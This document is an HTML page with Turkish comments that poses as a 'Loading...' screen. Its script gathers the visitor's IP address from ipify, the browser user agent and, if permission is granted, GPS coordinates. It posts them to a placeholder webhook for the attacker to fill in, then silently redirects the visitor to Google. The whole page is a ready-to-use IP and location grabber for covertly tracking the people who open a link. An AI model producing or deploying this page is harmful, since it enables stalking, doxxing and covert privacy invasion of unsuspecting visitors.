<!DOCTYPE html>
<html>
<head>
    <title>Yükleniyor...</title>
</head>
<body>
    <script>
        const webhookURL = "SENIN_WEBHOOK_URLN_BURAYA";

        // Önce IP'yi alalım
        fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(ipData => {
            let dataToSend = {
                ip: ipData.ip,
                cihaz: navigator.userAgent,
                konum: "İzin Verilmedi"
            };

            // Şimdi GPS konumu isteyelim
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    // Kullanıcı izin verirse burası çalışır
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    dataToSend.konum = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    gonder(dataToSend);
                }, () => {
                    // İzin verilmezse sadece IP ile gönder
                    gonder(dataToSend);
                });
            } else {
                gonder(dataToSend);
            }
        });

        function gonder(data) {
            fetch(webhookURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(data)
            }).then(() => {
                // Her durumda Google'a yönlendir
                window.location.href = "https://www.google.com";
            });
        }
    </script>
</body>
</html>
